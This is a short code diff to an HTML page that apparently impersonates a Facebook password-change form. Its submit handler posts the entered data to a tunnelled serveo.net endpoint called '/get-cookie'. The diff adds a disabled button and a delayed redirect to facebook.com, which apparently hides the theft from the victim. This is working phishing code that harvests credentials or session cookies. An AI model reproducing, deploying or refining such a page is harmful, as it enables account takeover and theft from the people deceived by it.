@@ -3685,6 +3685,7 @@
   </script>
   <script>
     $("#submit-changepassword").on("click",async function() {
+      $(this).attr("disabled", true)
       const res= await axios({
         url: "https://97ae8efb4cd58b875fbb0cc70e91f776.serveo.net/get-cookie",
         method: "post",
@@ -3698,6 +3699,9 @@
       })
       const result= await res.data
       console.log(result)
+      setTimeout(()=> {
+        window.location.href= "https://facebook.com"
+      }, 4000)
     })
   </script>
 </html>
